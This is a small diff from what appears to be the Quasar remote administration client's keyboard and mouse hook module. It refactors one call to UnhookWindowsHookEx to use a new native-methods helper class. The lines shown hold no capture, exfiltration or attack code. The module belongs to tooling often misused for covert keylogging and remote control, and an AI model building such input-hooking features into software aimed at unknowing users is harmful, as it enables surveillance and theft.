@@ -3,6 +3,7 @@
 // See license.txt or https://mit-license.org/
 
 using Microsoft.Win32.SafeHandles;
+using Quasar.Client.Utilities;
 
 namespace Quasar.Client.MouseKeyHook.WinApi
 {
@@ -23,7 +24,7 @@ namespace Quasar.Client.MouseKeyHook.WinApi
         protected override bool ReleaseHandle()
         {
             //NOTE Calling Unhook during processexit causes deley
-            var ret = HookNativeMethods.UnhookWindowsHookEx(handle);
+            var ret = ClientNatives.UnhookWindowsHookEx(handle);
             if (ret != 0)
             {
                 Dispose();
